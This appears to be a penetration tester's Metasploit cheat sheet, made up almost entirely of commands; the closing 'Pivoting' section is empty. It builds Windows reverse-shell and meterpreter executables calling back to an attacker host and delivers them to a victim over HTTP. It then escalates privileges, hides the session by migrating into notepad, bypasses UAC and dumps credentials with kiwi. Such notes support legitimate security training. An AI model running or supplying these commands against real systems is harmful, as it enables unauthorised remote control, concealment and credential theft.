# Metasploit

## Msfconsole

```
$ sudo msfdb init
$ sudo systemctl enable postgresql
$ sudo msfconsole
> db_status
> help
workspace
workspace -a newassesment
```

## Auxiliary modules

```
show auxiliary
search type:auxiliary someservice
use somenum
info
show options
set someoption somevalue
unset someoption
service -p someport --rhosts
run
vulns
creds
```

## Exploit modules

```
search someservice
use num
show options
set svar sval
run
run -j
^z
session -l
session -i 1
```

## Payloads

```
show payloads
use payload num
run
shell
^z
channel -i num
```

## Msfvenom

### Staged Nok
```
$ msfvenom -l payloads --platform windows --arch x64
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=AttackerIP LPORT=AttackerPort -f exe -o nonstaged.exe
$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=AttackerIP LPORT=AttackerPort -f exe -o staged.exe
$ python3 -m http.server 80
$ rdesktop VictimIp -u user -p pass -g num%+offsetX+offsetY
> iwr -uri http://AttackerIp/nonstaged.exe -outfile nonstaged.exe
> iwr -uri http://AttackerIp/staged.exe -outfile staged.exe
> .\nonstaged.exe # Ok 
> .\staged.exe # Nok
```

### Multi-handler
```
$ msfconsole
> use multi/handler
> set payload windows/x64/shell/reverse_tcp
> show options
> set LHOST AttackerIp
> set LPORT AttackerPort
> run # or `run -j` and `sessions -l` and `sessions -i num`
PS > ./stage.exe # Ok
```

## Meterpreter payload

```
$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=AttIP LPORT=AttPort -f exe -o met.exe
$ python3 -m http.server 80
msf > set payload windows/x64/meterpreter_reverse_https
msf > set LPORT 443 # LHOST set before... /!\
msf > run
$ nc VictimIp 4444
cmd> powershell
PS > iwr -uri http://AttIp/met.exe -outfile met.exe
PS > ./met.exe
meterpreter > idletime
meterpreter > shell
shell > whoami /priv # SeImpersonatePrivilege activated ???
shell > exit
meterpreter > getuid
meterpreter > getsystem
meterpreter > getuid # rights escalated +++
meterpreter > ps # get met.exe PID
meterpreter > migrate somepidtohidthemeterpreter
meterpreter > execute -H -f notepad # Hide the meterpreter in notepad
meterpreter > migrate notepadpid
meterpreter > getenv someenvvar
```

## Post-exploitation

```
PS > ^z # background channel
meterpreter > bg # background session, get number
msf > search uac
msf > search enumeration hosts
msf > use exploit/windows/local/bypassuac_sdclt
msf > use post/windows/gather/enum_hostfile
msf (exploit|post) > show options
msf xxx > set session session_number
msf xxx > run
meterpreter > shell
cmd > powershell -ep bypass
PS > Import-Module NtObjectManager
PS > Get-NtTokenIntegrityLevel
PS > exit # or ^z
meterpreter > load kiwi
meterpreter > help
meterpreter > creds_msv
```

## Pivoting


